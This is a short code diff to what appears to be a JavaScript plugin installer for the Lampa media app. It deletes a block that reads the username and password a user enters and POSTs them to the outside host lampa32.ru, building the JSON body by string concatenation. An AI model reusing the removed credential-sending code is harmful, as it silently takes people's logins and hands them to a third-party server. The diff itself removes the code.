@@ -30,29 +30,7 @@ function itemON(sourceURL, sourceName) {
 			}, 300);
 };
 --> */
-	$(document).ready(function () {
-    $("#btnSubmit").click(function () {
-        //collect userName and password entered by users
-        var userName = $("#username").val();
-        var password = $("#password").val();
-
-        auth(userName, password);
-    });
-});
-function auth(userName, password) {
-    $.ajax
-    ({
-        type: "POST",
-        //SEND TO MY SERVER URL
-        url: "http://lampa32.ru",
-        dataType: 'json',
-        async: true,
-        data: '{"userName": "' + userName + '", "password" : "' + password + '"}',
-        success: function (response) {
-          alert(JSON.stringify(response));
-        }
-    })
-}
+	
 
 function itemON(sourceURL, sourceName, sourceAuthor, itemName) {
 if ($('DIV[data-name="' + itemName + '"]').find('.settings-param__status').hasClass('active')) {Lampa.Noty.show("Плагин уже установлен!")} else {
